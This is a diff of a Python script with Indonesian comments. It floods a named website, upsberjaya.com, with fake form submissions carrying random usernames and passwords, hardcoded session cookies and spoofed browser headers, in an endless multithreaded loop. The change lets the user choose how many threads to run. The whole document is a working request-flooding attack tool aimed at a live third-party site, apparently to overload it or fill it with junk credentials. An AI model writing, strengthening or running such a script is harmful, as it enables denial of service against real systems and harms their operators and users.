@@ -23,10 +23,9 @@ def make_http_request():
     random_password = generate_random_string(100)
 
     cookies = {
-    'chaport-64badb6587d008fca92fd44d': '8edd8340-a3a5-4abd-86bb-3b111e0b437e%2FYGF7Q4NuASw1zE3qA9mb9xKxZjy2uhoyQxbJVw',
-    'PHPSESSID': 'tllqce9uahf3c176f6r0imi793',
+        'chaport-64badb6587d008fca92fd44d': '8edd8340-a3a5-4abd-86bb-3b111e0b437e%2FYGF7Q4NuASw1zE3qA9mb9xKxZjy2uhoyQxbJVw',
+        'PHPSESSID': 'tllqce9uahf3c176f6r0imi793',
     }
-
 
     headers = {
         'authority': 'upsberjaya.com',
@@ -44,7 +43,7 @@ def make_http_request():
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
     }
-    
+
     data = {
         'username': generate_random_string(10),
         'pass': random_password,
@@ -65,7 +64,10 @@ def make_http_request():
     # Output response
     print(response.text)
 
-# Meminta input dari pengguna
-with ThreadPoolExecutor(max_workers=None) as executor:
+# Meminta input jumlah thread dari pengguna
+num_threads = int(input("Masukkan jumlah thread yang ingin digunakan: "))
+
+# Jalankan thread sesuai jumlah yang diminta
+with ThreadPoolExecutor(max_workers=num_threads) as executor:
     while True:
         executor.submit(make_http_request)
